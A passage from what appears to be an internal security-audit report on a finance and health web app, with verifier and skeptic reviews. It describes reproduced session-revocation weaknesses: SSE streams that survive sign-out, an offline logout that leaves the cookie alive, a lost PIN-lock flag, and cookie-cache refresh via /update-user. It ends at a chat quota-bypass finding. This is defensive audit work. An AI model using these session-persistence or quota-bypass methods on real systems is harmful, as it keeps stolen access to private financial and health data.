requireSession() стоїть у ланцюжку роута (sync.ts:80) і резолвить сесію ЛИШЕ під час handshake; syncV2Stream зберігає req.user один раз (:216) і більше сесію не перевіряє. Жодного механізму закрити стріми юзера при logout/revoke немає — onOps чіпляється на канал `user:<id>` і знімається тільки в req/res 'close'.
LIVE (focused-persistence.json): відкрито 2 стріми під сесією S1 → control-push через другу сесію S2 доставлено обом (delivered_pre=[1,1]) → POST /api/auth/sign-out сесії S1 = 200 → push через S2 ЗНОВУ доставлено ВЖЕ ВИЛОГІНЕНИМ стрімам (delivered_post=[1,1]); через 15с стріми ще відкриті (closed:false). Серверний лог (server.log, redacted userId): {"msg":"sync_v2_stream_closed","userId":"9f28a02c...","ms":21828} — стрім прожив 21.8с, перекривши момент sign-out. Стрім несе прикладні op-и (finyk/ health — GDPR Art.9) через decryptOpRowForPull.
```

**Відтворення:**

```text
node <scratch>/agents/api-live-gap-sse-concurrent-connection-exhaustion/focused-persistence.mjs sse-exhaust-2: відкрити стріми під S1, sign-out S1, push через другу сесію S2 — доставка на вилогінені стріми (delivered_post=[1,1]).
```

**Верифікатор:**

```text
Code check: requireSession() resolves the session once, at handshake, through the cookie-cached getSessionUser. syncV2Stream stores req.user (:216) and subscribes to `user:<id>` (:331-348). Cleanup runs only on req/res close or aborted (:366-411). No path re-checks the session or closes a stream on sign-out, revoke, or password change; opLogEmitter is used only in syncV2Stream.ts.

The project already accepts a bounded 5-minute cookie-cache window for normal routes and moved sensitive routes to requireFreshSession (orphaned-code-audit §7а). Long-lived SSE escapes even that bound, so revocation never evicts an already-open stream.

Reproduced live with my own two sessions on throwaway user sse-exhaust-2:
1. Stream opened under S1; a control push via S2 was delivered.
2. POST /api/auth/sign-out with S1 returned 200. The DB session count went 3 → 2, and requireFreshSession route /api/me/export with the S1 cookie returned 401.
3. A push via S2 was still delivered to the S1 stream.
4. After 330s more, with the cookie cache expired, normal routes with the S1 cookie returned 401 and a new stream handshake with S1 returned 401. A further push ('verify late') was still delivered to the revoked stream, which had sent 13 heartbeats and stayed open.

Live frames carry the client-pushed row verbatim (syncV2.ts:548-556). The web sync engine does push real finyk, nutrition and health ops via /api/v2/sync/push, so the leaked data is the user's real data.

Severity stays high because this is continued access to real data after the revocation the user performs to evict an attacker. That is the same 'recovery path does not recover' family the project rated Priority 1 in security-comprehensive-2026-08-04 §1.6. The precondition is a prior session theft, and the leak is limited to the same user's data, not other users'.
```

**Додаткові докази верифікатора:**

```text
Output: <scratch>/agents/verify-api-live-gap-sse-concurrent-connection-exhaustion/signout.json and signout.log.

Result: {sessionsBefore:3, sessionsAfter:2, freshRouteS1:401, cachedRouteS1_immediately:200, post.deliveredToRevokedStream:1, cachedRouteS1_after5min:401, newStreamS1_after5min:401, late:{deliveredToRevokedStream:1, closed:false, heartbeats:13, lastOpNote:'verify late'}}.

An earlier run (signout-run1-interrupted-by-restart.log) showed the same immediate post-sign-out delivery before an orchestrator restart cut it off.

Related but not the same issue: security-comprehensive-2026-08-04.md §1.6 (cookieCache 5-minute window) and 2026-08-05-orphaned-code-audit.md §7а (requireFreshSession). Neither mentions SSE streams.
```

**Скептик:** не спростував, оцінка medium.

```text
The core defect is real, so I can't refute it. The severity is inflated, though, and part of the impact claim is wrong. I'd rate it medium, not high.

**Code trace (confirmed)**
- The request passes through the pre-auth IP limiter, then `requireSession()` (`apps/server/src/routes/sync.ts:80`), then the per-user limiter and the stream limiter (`sync.ts:90-98`). The session is resolved exactly once, at handshake.
- `syncV2Stream` captures `req.user` once (`apps/server/src/modules/sync/syncV2Stream.ts:216`) and subscribes to `user:<id>` (`:331`, `:348`).
- Teardown happens only on `req` close/aborted or `res` close (`:409-411`). Nothing on the path re-checks the session, enforces a maximum stream lifetime or reacts to sign-out or revoke. The server has no socket or response timeout either; `index.ts` only sets `keepAliveTimeout` and `headersTimeout`, and heartbeats every 25s keep the socket active.
- Session config is in `apps/server/src/auth.ts:424-431`: 7-day expiry and a 5-minute `cookieCache`. The stream outlives even that accepted bound, as well as natural expiry.

**My own live re-run (stronger than the claim)**
Script and output: `<scratch>/agents/skeptic-api-live-gap-sse-concurrent-connection-exhaustion-2/revoke.mjs` and `revoke.json`.
1. The attacker session ATT opened a stream (200, `caught_up`).
2. The victim session VIC called `POST /api/auth/revoke-sessions` ("log out everywhere"), which returned 200. The DB session count went from 3 to 0, and `/api/me/export` with ATT returned 401.
3. The victim signed in again and pushed a `finyk_budgets` op. It was delivered to ATT's already-open stream (`deliveredToAttackerStream: 1`, `closed: false`).

So the user's strongest recovery action does not evict an attacker's open stream.

**Why high is inflated**
1. **Precondition is prior full compromise.** The attacker must already hold a valid session token and must have deliberately opened the stream before revocation. This is post-compromise persistence (CWE-613), not an initial auth bypass. Before revocation the same token could already dump all history via `/pull` or `/me/export`. What the stream adds is only *new* ops the victim pushes after revocation.
2. **The window is bounded.** After revocation and the 5-minute cache, a reconnect returns 401 (verifier's run: `newStreamS1_after5min: 401`). The leak therefore lasts one TCP connection. In prod that connection dies on any process restart, and `deploy-api` redeploys the container on every green push to `main` (AGENTS.md § Deployment; ADR-0102). Proxy timeouts on the Traefik edge may also cut it. "Unbounded in prod" overstates it: it is typically hours, possibly days in a quiet period.
3. **The resource-exhaustion amplifier claim is wrong.** No first-party client consumes `/api/v2/sync/stream`. A grep of `apps/web/src`, `apps/mobile` and `apps/mobile-shell` finds no `EventSource` or `sync/stream` consumer. `docs/work/specs/planning/sync-client-wiring.md:4,83` marks it "NO CONSUMER (Phase 3)", and the orphaned-code audit (§ line 173) agrees. Legitimate logouts therefore never leave orphaned streams behind. An attacker who wants to hold fds open can do so with their own valid sessions, so revocation adds nothing to fd exhaustion. That part of the impact should be dropped or folded into the separate connection-exhaustion finding.
4. **Scope is narrow.** Only the same user's data leaks, never another user's, and nothing is written.

**Why it is still medium, not low**
- It defeats the explicit eviction controls: logout-all, revoke after password change, and `revokeSessionsOnPasswordReset` (`auth.ts:375`).
- It leaks plaintext financial and health ops. Live frames carry the pushed row verbatim.
- The project's own audit treats "the recovery path does not evict the attacker" as a Priority-1 family (`docs/work/specs/audits/security-comprehensive-2026-08-04.md:176-196`). That audit does not mention SSE, so this is a new instance.
- A fix is cheap: re-validate the session (for example via `getFreshSessionUser`) on each heartbeat, and/or cap stream lifetime at no more than `cookieCache.maxAge`, and/or close streams for a user on sign-out or revoke.
```

### [high] Невдалий POST /api/auth/sign-out (офлайн чи обрив мережі) лишає живу серверну сесію і httpOnly-cookie: наступне відкриття застосунку знову входить в акаунт X

- **ID:** `browser-crosscut/data-isolation-browser#3` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Браузер · наскрізне
- **Стан:** відкрито
- **Де:** apps/web/src/core/auth/AuthContext.tsx:586-593 (`try { await signOut(); } catch {}`, без повтору і без маркера «вихід не завершено»); apps/web/src/core/auth/authClient.ts:194-202; офлайн-діалог у core/profile/ProfilePage.tsx; URL http://127.0.0.1:4173/profile
- **Вплив:** Людина натискає «Вийти» без мережі (UI прямо пропонує це офлайн) і віддає пристрій. Наступна людина відкриває застосунок і отримує повний доступ до акаунта X: фінанси, AI-памʼять, налаштування, видалення акаунта.
- **Що зробити:** Не вважати вихід завершеним, поки сервер не підтвердив sign-out. Перед локальним teardown записати маркер «pending sign-out» і на кожному старті спершу виконувати sign-out, а сесію не відновлювати, доки маркер стоїть. Офлайн або блокувати вихід, або чесно попереджати, що сесію буде закрито лише після появи мережі. Також не кешувати /api/v1/me у SW-партиції 'anon'.

**Докази:**

```text
26-run.log (abort лише для /api/auth/sign-out): після «Вийти» UI переходить на /sign-in. cookies after logout: ["better-auth.session_token","better-auth.session_data"]. Наступний візит на / показує хаб X «Доброї ночі, Audit … Витрати 2 331 ₴ … Їжа 2100 ккал» (shots/.../26-next-visit.png). GET /api/v1/me → 200 {"user":{"id":"PGQL4sLE…","email":"dib_x_964@example.com"…}.
24-run.log (офлайн): діалог «Зараз немає мережі… Дані з цього пристрою зітруться одразу, а повернуться лише після входу» → «Вийти» → за кілька секунд знову хаб X (24-offline-after-logout.png). Після відновлення мережі /api/v1/me віддає 200 для X.
25-run.log: FAIL POST /api/auth/sign-out net::ERR_INTERNET_DISCONNECTED → /sign-in → SW відповідає на GET /api/v1/me (sw=true) даними X і кладе їх під ключ `/api/v1/me?__u=anon` → «Переношу дані в профіль…» → знову /.
```

**Відтворення:**

```text
1) Увійти як X. 2) Вимкнути мережу (або заблокувати лише /api/auth/sign-out). 3) /profile → «Вийти» → «Вийти». 4) Увімкнути мережу і відкрити http://127.0.0.1:4173/: користувач знову X. Скрипти: 24-offline-logout.mjs, 25-offline-logout-trace.mjs, 26-signout-fail.mjs.
```

**Верифікатор:**

```text
AuthContext.tsx `logout()` робить `setSignedOut(true)`, потім `try { await signOut(); } catch {}` і далі повний локальний teardown з `location.assign('/sign-in')`, хоч би чим закінчився sign-out. Ні повтору, ні маркера «вихід не завершено» немає (grep pendingSignOut/signOutPending нічого не знаходить). Cookie better-auth мають прапорець httpOnly, і клієнт їх стерти не може, тож без успішного POST /api/auth/sign-out серверна сесія лишається живою. Офлайн-діалог (ProfilePage.tsx:265) прямо пропонує вийти без мережі. Відтворено в обох режимах.
```

**Додаткові докази верифікатора:**

```text
v3-abort.log: блокуємо лише /api/auth/sign-out → «Вийти» → URL /sign-in, але cookies ["better-auth.session_token","better-auth.session_data"], а /api/v1/me → 200 {"user":{"email":"vdib_so_1663@example.com"…}}. v3-offline.log: діалог «Зараз немає мережі, тож увійти назад не вийде… Дані з цього пристрою зітруться одразу» → «Вийти». Після відновлення мережі нова вкладка на / показує «Доброго ранку, Audit · Пʼятниця…», тобто хаб X (shots/verify-browser-crosscut-data-isolation-browser/v3-offline-next-visit.png), а /api/v1/me віддає 200 для X.
```

**Скептик:** не спростував, оцінка medium.

```text
I could not refute the bug. I reproduced it myself, but I think high overstates it, and I would rate it medium.

**Code path**
- `logout()` sets an in-memory flag at apps/web/src/core/auth/AuthContext.tsx:586 (`setSignedOut(true)`).
- It then runs `try { await signOut(); } catch {}` at AuthContext.tsx:587-593. It never checks a `{error}` result, never retries, and never stores a "logout not finished" marker. A grep for pending/sign-out markers finds nothing.
- The local teardown then runs and ends with `location.assign('/sign-in')` at AuthContext.tsx:689.
- `signedOut` is plain `useState` (AuthContext.tsx:336), so the full reload loses it. The fresh `/api/v1/me` request then decides who is signed in.
- The `signOut` wrapper only clears the bearer token on Capacitor (authClient.ts:194-202). On web the session cookie is httpOnly, so only a successful `POST /api/auth/sign-out` can clear it.
- Sessions last 7 days and roll forward with use (apps/server/src/auth.ts:424-431).
- The UI offers logout while offline with the text "Зараз немає мережі, тож увійти назад не вийде…" (ProfilePage.tsx:265). That tells the person they are signed out.

**My own reruns** (scripts and logs in scratchpad/agents/skeptic-browser-crosscut-data-isolation-browser-3/)
- **Offline run:** I aborted every request to 127.0.0.1:3000 with `ctx.route` and also called `setOffline`, so service-worker traffic could not bypass the offline state. Result:
  - The dialog showed the offline text, and the page landed on /sign-in showing "З поверненням … Увійти". The person sees what looks like a completed logout.
  - The `better-auth.session_token` cookie (httpOnly=true) had the same value before and after logout, `emVcpw7m2ON0…`.
  - A read-only query on the DB `session` table showed the row with token `emVcpw7m2ON0` still alive, expiring 2026-10-09.
  - After the network came back, a new tab on / opened user X's hub ("Доброго ранку, Audit · Пʼятниця…"). `/api/v1/me` returned 200 with skep3_so_off_1384@example.com.
- **503 run:** I made sign-out return 503. The token was unchanged and the user went straight back to the hub as X.

**Why I rate it medium, not high**
1. It only goes unnoticed when the device is offline at logout. If sign-out fails while the network is up (503 or an aborted request), the reload immediately shows X's hub again (`url after logout: /`), so the person can see the logout failed and retry.
2. Exploiting it needs a chain of conditions: the victim logs out without network, a second person physically uses the same browser profile within about 7 days, and the victim has not reopened the app online in the meantime. An attacker cannot trigger it remotely.
3. On the native shell the bearer token is cleared in `finally` anyway, so only web/PWA is affected.
4. This is the standard "logout does not end the session" weakness (CWE-613, ASVS 3.3.1), which is usually rated medium.

It should not be rated lower than medium. The UI explicitly supports logging out offline, the result looks exactly like a successful logout, and the app treats shared devices as a real threat (Audit 03, F17). When it does happen, the next person gets full access to X's finance and AI-memory data.

**Recommended fix:** treat a failed sign-out as unfinished. Store a "sign-out pending" marker and re-send `POST /api/auth/sign-out` on startup or when the network returns, before trusting `/api/v1/me`. Also check `result.error`, and do not show the "you are signed out" state until the server confirms it.
```

### [high] PIN-блокування не вмикається після перезавантаження: прапорець `app-lock-enabled` губиться на кожному холодному старті

- **ID:** `client-static/web-storage-session#1` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/src/core/lib/featureFlags.ts:93-98,115-123,153-159; apps/web/src/shared/lib/storage/typedStore.ts:193-200,255-257; apps/web/src/shared/lib/storage/storage.ts:151-173; apps/web/src/main.tsx:198-215; apps/web/src/core/security/useAppLock.ts:51,64-73; apps/web/src/core/app/Providers.tsx:69
- **Вплив:** Захист, який людина свідомо вмикає для спільного пристрою, працює лише до першого перезавантаження. Закрита й заново відкрита PWA, нова вкладка чи reload дають повний доступ до фінансів і здоровʼя без PIN. Тумблер показує «вимкнено», і людина не розуміє чому. Та сама вада скидає всі прапорці FLAG_REGISTRY (`hub_command_palette` тощо), recents палітри команд і підтвердження в «Експериментальному».
- **Що зробити:** Не кешувати значення typedStore назавжди: перечитувати після `markStorageReady` або підписуватись на `onChange` уже після буту KV-сховища. Прапорець блокування зберігати поза партицією акаунта: durable-дзеркало в LS або запис у самому IndexedDB `sergeant_app_lock` поруч із хешем PIN. Вмикати замок за наявністю креденшела (`hasPinSet(userId)`), а не за прапорцем, і не рендерити дані, доки перевірку не завершено.

**Докази:**

```text
Браузер (lock3.mjs, той самий контекст): `after setup switch checked: true` -> reload -> `AFTER RELOAD: locked= false switch checked= false`; перемикання вкладок -> `locked= false`. Скрін shots/client-static-web-storage-session/lock2-reload-late.png: після reload відкрито весь профіль без PIN. Причина: React монтується до `bootstrapKvStore()` (main.tsx:198-215). `AppLockProvider` у першому рендері кличе `getFlag`, і typedStore кешує значення, прочитане з LS-адаптера до буту (`cachedLoaded = true`, :198). Підписка `webKVStore.onChange` (:255) теж привʼязується до LS-адаптера, тож `replaceCache` SQLite-сховища її не будить. Сам прапорець пишеться лише в `kv_store` SQLite-партиції акаунта. Документ docs/engineering/architecture/feature-flags.md:131 стверджує, що значення лежить у localStorage, і це не так.
```

**Відтворення:**

```text
node <scratch>/agents/client-static-web-storage-session/lock3.mjs wss-lock1: Профіль -> Безпека -> Блокування застосунку -> увімкнути, PIN 1234 двічі -> перезавантажити сторінку: екрана PIN немає, тумблер вимкнений, PIN у IndexedDB лишився.
```

**Верифікатор:**

```text
Відтворено у браузері на свіжому користувачі (vwss-lock1). Увімкнув блокування з PIN 1234: тумблер став `true`, сирий LS `hub_flags_v1` = null. Після reload замка немає ні через 1, ні через 3, 6 чи 10 с, тумблер `false`, нова вкладка теж без замка. Скан OPFS у тому ж контексті знайшов у файлі SQLite-партиції `hub_flags_v1{"__v":1,"data":{"app-lock-enabled":true}}`. Тобто значення зберігається, але після холодного старту його не читають. Код збігається з описом. `main.tsx:198-200` монтує React до `bootstrapKvStore()`. `AppLockProvider` (Providers.tsx:69) жодним гейтом не прикритий і через `useFlag` → `flagsStore.get()` кешує значення, прочитане з LS до буту (`cachedLoaded = true`, typedStore.ts:196-199). Після буту store ніхто не перечитує: `reload()` викликає лише `onChange`, привʼязаний при створенні модуля до LS-адаптера (storage-event), а `replaceCache` SQLite-сховища його не будить. Гейт `markStorageReady` стосується лише guard-ів маршрутів. Нейтралізатора немає.
```

**Додаткові докази верифікатора:**

```text
Скрипти: <scratch>/agents/verify-client-static-web-storage-session/v1-lock-reload.mjs (`after setup switch: true` → `t+10000ms after reload: locked= false`, `after reload switch: false`, `new tab locked= false`) і v1c.mjs (знайдено OPFS-рядок `hub_flags_v1{"__v":1,"data":{"app-lock-enabled":true}}`). Той самий клас вади (прапорець пишеться в kv_store, а читається з сирого LS) уже описаний у docs/work/specs/sqlite-opfs-worker.md:155-174 для `storage_sqlite_worker`. Лікування звідти (`PRE_BOOT_FLAG_IDS`) у featureFlags.ts зараз відсутнє, а `app-lock-enabled` там ніколи не згадувався. Рядок docs/engineering/architecture/feature-flags.md («Живуть у localStorage (`hub_flags_v1`)») хибний.
```

**Скептик:** не спростував, оцінка high.

```text
I tried to refute this and couldn't. I traced the code path and reproduced the bug myself.

Code path, traced end to end at HEAD c7c09607:
1. `flagsStore` is created when `featureFlags.ts` is evaluated (featureFlags.ts:93-98). That happens in the eager graph, before `mountApp()`. At creation, `createTypedStore` immediately calls `webKVStore.onChange(key, reload)` (typedStore.ts:255-257). `webKVStore.onChange` resolves the backend at call time (storage.ts:170-172 → `resolveStore()` storage.ts:151-155). Before boot, `getActiveSqliteKvStore()` is null, so the subscription is bound to the localStorage adapter's DOM `storage` event. The SQLite adapter's `replaceCache` and writes never fire it.
2. `get()` caches the first read permanently (`cachedLoaded = true`, typedStore.ts:193-200). Nothing ever calls `flagsStore.reload()`. A grep for `.reload()` and `flagsStore` across apps/web/src finds only tests, and there is no hook on `markStorageReady`.
3. main.tsx:198-200 mounts React first. `bootstrapKvStore()` runs later, async (main.tsx:211-273). On top of that, boot opens the anon partition (sqlite.ts:102-109, kvStoreBoot.ts:176). The user partition, where `setFlag` wrote `app-lock-enabled`, is loaded only after auth resolves, via `switchSqliteUser` → `refreshKvWarmCache` → `store.replaceCache` (sqlite.ts:187, kvStoreBoot.ts:300). So even when the router's `HydrateFallback` delays the first render past boot, the first read of `useFlag('app-lock-enabled')` still lands before the user partition is loaded. That read comes from `AppLockProvider` (Providers.tsx:69), which `AnonymousDataMigrationProvider` renders while `status !== 'authenticated'`. It is not a race. It is deterministic for every signed-in user.
4. All lock behaviour is gated on that flag: cold-start lock, visibilitychange lock and idle lock (useAppLock.ts:51, 64-73, 77-87, 92-103). `AppLock` in RootLayout.tsx:195-207 only renders `appLock.state`. Nothing else neutralises the problem. The only case where it works is when SQLite fails to boot: then everything stays on localStorage, which is the minority path.
5. This trap is already documented in docs/work/specs/sqlite-opfs-worker.md:155-174 for `storage_sqlite_worker`. The fix described there (`PRE_BOOT_FLAG_IDS`) was later removed (spec line 287). That spec wrongly assumes ordinary flags are both read and written after boot, which is not true for `app-lock-enabled`. The doc line feature-flags.md:131 ("live in localStorage") is also wrong.

Dynamic reproduction (<scratch>/agents/skeptic-client-static-web-storage-session-1/s1.mjs, fresh pool user audit_pool163):
- Enabled the lock with PIN 1357: `after setup switch: true`, raw `LS hub_flags_v1: null`.
- After reload: `locked=false` at 2, 5 and 12 s.
- A synthetic visibilitychange also gave `locked=false`.
- The toggle reads `checked: false` after reload.
- Screenshot shots/skeptic-client-static-web-storage-session-1/s1-after-reload1.png shows the full profile with no PIN screen.
- My new-tab check is not usable: the single-tab DB-ownership screen "Sergeant уже відкрито в іншій вкладці" blocked it. That does not affect the reload result.

Side effect: after reload `cached={}`, so `setFlag` for any other flag writes `{other:true}` over the record and erases the stored `app-lock-enabled`.

Severity: the main limit is that exploiting it needs physical access to an unlocked device or browser profile. The UI also shows the toggle as off after reload, so the failure is not completely silent. Even so, a security feature the user explicitly turns on gives zero protection in its main scenario: a cold open of the PWA or tab, a phone handed to someone else, or the OS killing the PWA process. The only skill needed is "reopen the app". Behind the lock are finance and health data. I'm keeping it at high. Rating it medium because of the physical-access precondition is defensible, but it is not low.
```

### [high] Відкликана сесія живе до 7 днів: `POST /api/auth/update-user` перевипускає cookie-кеш без перевірки в БД

- **ID:** `server-static/auth-session#1` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:424-431 (session.cookieCache enabled, maxAge 300); node_modules/better-auth/dist/api/routes/update-user.mjs:16,69 (updateUser: sessionMiddleware → setSessionCookie); node_modules/better-auth/dist/cookies/index.mjs:93,118-131 (новий expiresAt = now+maxAge); apps/server/src/http/requireSession.ts:83-91 (requireSession бере сесію з кешу)
- **Вплив:** Вихід, «вийти з усіх пристроїв», зміна пароля (хук revokeOtherSessions) і скидання пароля (revokeSessionsOnPasswordReset) не виганяють зловмисника з украденою кукою: достатньо раз на &lt;5 хв смикати update-user, і всі роути під `requireSession()` (sync, finyk, nutrition, chat, профіль) лишаються доступними до кінця 7-денного TTL сесії. Задокументоване в ADR-0017 «вікно 5 хв» насправді не обмежене. Захищені лише поверхні під requireFreshSession (експорт, видалення, банк).
- **Що зробити:** У `hooks.before` для `/update-user` (і будь-якого ендпоінта зі `sessionMiddleware`, що викликає setSessionCookie) резолвити сесію через `getSession({ query: { disableCookieCache: true } })` і відхиляти 401, якщо в БД її немає; або прив'язати `session.cookieCache.version` до лічильника відкликань користувача, або вимкнути cookieCache. Додати регресійний тест «revoke → update-user → через 6 хв /api/me = 401».

**Докази:**

```text
Перевірено наживо на одноразовому користувачі (audit_pool63), лог: <scratch>/agents/server-static-auth-session/revoke-persist.log
22:41:48 C1 sign-in 200; victim C2 → POST /api/auth/revoke-other-sessions 200
22:41:48 C1 get-session?disableCookieCache=true → 200 null (у БД сесії немає)
далі кожні 2 хв C1 → POST /api/auth/update-user {name} → 200, Set-Cookie: better-auth.session_token, better-auth.session_data
t+361s /api/me refreshed-C1=200 frozen-C1=401
t+481s /api/me refreshed-C1=200 frozen-C1=401
фінал: DB truth для C1 = null, /api/me/deletion-status через C1 = 200.
updateUser використовує `sessionMiddleware` (довіряє підписаному cookie-кешу), викликає `internalAdapter.updateUser(session.user.id)` (юзер існує → успіх) і `setSessionCookie(ctx,{session: session.session ...})`, а setCookieCache ставить `expiresAt = getDate(maxAge)` від поточного моменту. getSession перевіряє лише `cachedSessionExpiresAt` (expiresAt сесії, до 7 днів).
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/revoke-persist.mjs (бере пул-юзера, логіниться = вкрадений C1, з другої сесії робить revoke-other-sessions, далі кожні 2 хв шле update-user з C1 і порівнює /api/me для оновленого і замороженого C1).
```

**Верифікатор:**

```text
Відтворено наживо і підтверджено в коді. `updateUser` (better-auth 1.6.23, dist/api/routes/update-user.mjs:16,54-69) стоїть на `sessionMiddleware`, тобто на `getSessionFromCtx`, який довіряє підписаному cookie-кешу. `internalAdapter.updateUser(session.user.id)` спрацьовує успішно, бо користувач існує, а `setSessionCookie` → `setCookieCache` ставить `expiresAt = getDate(maxAge)` від поточного моменту (cookies/index.mjs:93). Рядок сесії в БД при цьому ніхто не перевіряє. Для порівняння, сусідній `/update-session` той самий випадок обробляє: `if (!updatedSession && isStateful(ctx)) → 401`, а `/update-user` ні, тобто це upstream-баг. `refreshCache` за замовчуванням вимкнений (create-context.mjs:149-163), тож кеш ніде більше сам не подовжується, і `/update-user` дає саме цю діру. Нейтралізаторів немає: у `auth.ts` хук `hooks.before` чіпає лише `/change-password`, `disabledPaths` не заданий, cookieCache увімкнено з maxAge 300. ADR-0017 приймає вікно відкликання лише до 5 хв (рядки 171-201), а тут воно фактично необмежене, обмежує його тільки `session.expiresAt` у кеші (до 7 днів від створення). Поверхні під `requireFreshSession` захищені: `/api/me/export` для того самого cookie дав 401.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-auth-session/v1-revoke.mjs (лог v1-revoke.log, pool-юзер audit_pool125):
01:29:42 revoke-other-sessions via C2 200; C1 DB truth = null; кеш C1 expiresAt 01:34:42, session.expiresAt 2026-10-09
01:33:03 (t+200s) update-user через відкликаний C1 → 200 {status:true}, новий кеш expiresAt 01:38:03; DB truth після нього все ще null
01:35:23 (t+340s, вже після 01:34:42) /api/me refreshed=200 frozen=401; /api/me/deletion-status refreshed=200; /api/me/export (requireFreshSession) refreshed=401.
У попередньому аудиті security-comprehensive-2026-08-04.md §1.6 записано лише 5-хвилинне вікно cookieCache (його закрили requireFreshSession на export/delete/bank), а необмежене продовження через /update-user там не згадано.
```

**Скептик:** не спростував, оцінка high.

```text
I could not refute this. I checked the code path end to end and reproduced it live myself, chaining two refreshes.

**Code path (better-auth 1.6.23, matches pnpm-lock.yaml:5976)**
- `apps/server/src/auth.ts:424-431` turns on `cookieCache` (maxAge 300) unconditionally. It sets no `secondaryStorage` and no `disabledPaths`, and has no env-dependent override, so prod behaves the same.
- The only `hooks.before` (`auth.ts:597-605`) returns early unless the path is `/change-password`.
- `routes/auth.ts:33` mounts `toNodeHandler(auth)` on `/api/auth/{*splat}` with no path allowlist, so `/update-user` is reachable.
- `node_modules/better-auth/dist/api/routes/update-user.mjs:16` puts `/update-user` on `sessionMiddleware`. That is `getSessionFromCtx`, which trusts the cookie cache (`session.mjs:316-323`). It is not `sensitiveSessionMiddleware`, which `change-password`, `change-email`, `revoke-*` and `delete-user` use.
- `update-user.mjs:54-69` calls `internalAdapter.updateUser(user.id)`, which succeeds because the user still exists, and then calls `setSessionCookie({session: session.session})`. It never checks the session row in the DB.
- `cookies/index.mjs:93` sets the new cache expiry to now + maxAge.
- `getSession` (`session.mjs:98-99`) only compares the cache expiry with `session.expiresAt`. `cookieRefreshCache` is forced to false in stateful mode (`create-context.mjs:149-156`), so nothing else is involved.
- `requireSession` (`http/requireSession.ts:83-91`, `auth.ts:714-725`) resolves through this cache. Its only extra DB lookup is the deletion-status check by `user.id`, which does not detect a revoked session.

**My live run** (`<scratch>/agents/skeptic-server-static-auth-session-1/chain.log`, pool user audit_pool92)
- Revoking from C2 returned 200. The DB truth for C1 was null right away.
- First refresh: `update-user` at t+240s returned 200.
- Second refresh: `update-user` at t+480s returned 200. This is after the original 5-minute cache expired; the frozen original cookie got 401 at that point. The DB truth was still null after the refresh.
- At t+560s, after the first-refresh cache expired: `/api/me` returned 200 with the second-refresh cookie and 401 with the first-refresh and original cookies. `GET /api/v2/sync/pull` returned 200 with the second-refresh cookie, so the attacker can reach data routes. `/api/me/export` returned 401.
- Chaining works, so access is unbounded until `session.expiresAt` in the cached copy (up to 7 days).

**Attempts to downgrade**
1. It needs an already stolen HttpOnly cookie pair, and the attacker must ping again within every 5 minutes. A single gap longer than 5 minutes loses access.
2. It cannot become an account takeover. `change-password`, `change-email`, `revoke-*` and `delete-user` use the DB-authoritative `sensitiveSessionMiddleware`. Export, account deletion and bank connect/disconnect sit behind `requireFreshSession` (`routes/me.ts:93,274,318`, `routes/banks.ts:45,55`).
3. It is capped at 7 days.

Under CVSS this would land around medium (~6). I still keep high because the repo's own calibration treats exactly this outcome as top priority:
- `docs/work/specs/audits/security-comprehensive-2026-08-04.md` §1.6 lists "a stolen session survives password reset for the 7-day TTL" as Priority 1 (to fix before beta).
- `revokeSessionsOnPasswordReset: true` and the H3 `change-password` hook were added to close it.
- ADR-0017 (lines ~171-201) accepts only a 5-minute revocation lag.

This bug quietly reopens that hole. "Log out everywhere", password change and password reset all fail to evict a cookie thief. The thief keeps read and write access (sync push/pull, finyk, nutrition, chat, profile) for up to 7 days.

It is an upstream better-auth bug, but the app is exposed by its config. A one-line fix is possible: a `hooks.before` for `/update-user` that resolves the session with `disableCookieCache`, or adding the path to `disabledPaths`.
```

### [high] Round-trip-квиток чату приймається на будь-якому запиті й видається знову: Free-юзер обходить тижневу AI-квоту безкінечним ланцюжком

- **ID:** `server-static/webhooks-billing-quota#2` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/chat/aiQuota.ts:335-341; apps/server/src/modules/chat/chatRoundTripTicket.ts:102-117; apps/server/src/modules/chat/chat.ts:340-360,786-790,894-913; apps/server/src/modules/chat/aiQuotaBudget.ts:148-156
- **Вплив:** Тижнева квота Free (ai.actions = 20) фактично не діє: необмежені виклики LLM на рахунок власника (cost abuse) і обхід пейволу Premium «без ліміту». Масштабується кількістю безкоштовних акаунтів.
- **Що зробити:** У assertAiQuota приймати квиток лише коли в тілі є і tool_results, і tool_calls_raw (і лише на /api/chat), а в chat.ts не видавати новий квиток на запит, який сам пройшов за квитком, і на перший тур взагалі не приймати квиток. Прив'язати квиток до trace/ходу (зберігати, що він для tool-result туру). preset-відро застосовувати лише для /api/chat. Додати тест «квиток + перший тур = списання».

**Докази:**

```text
aiQuota.ts:335: `if (meter === "ai" && sessionUser && tryConsumeRoundTripTicket(req, sessionUser.id)) { return true; }` — квиток знімає списання без перевірки, що запит справді є продовженням (немає умови `tool_results && tool_calls_raw`). chat.ts first-turn (без tool_results) на відповідь із tool_calls завжди робить `res.status(200).json(attachRoundTripTicket(body, ledgerUserId, chatTraceId))` (913), а на cache-hit — так само (789), незалежно від того, чи цей запит сам був «оплачений» квитком. Відповідь містить `text: textParts` поряд із tool_calls. Квиток споживається будь-яким роутом з `requireAiQuota()` (meter "ai"): coach/insight, nutrition day-plan/recipes/shopping-list/parse-pantry — їхні схеми не `.strict()`. Тесту на «квиток на першому турі» немає (chat.roundTripTicket.test.ts має лише 2 кейси на видачу). Додатково: `resolvePresetBudget` читає `preset` з сирого тіла на КОЖНОМУ meter="ai" роуті (не лише чат), тож +14/тиждень можна списувати з preset-відер на coach/nutrition, де OFF_TOPIC_RULE не діє.
```

**Відтворення:**

```text
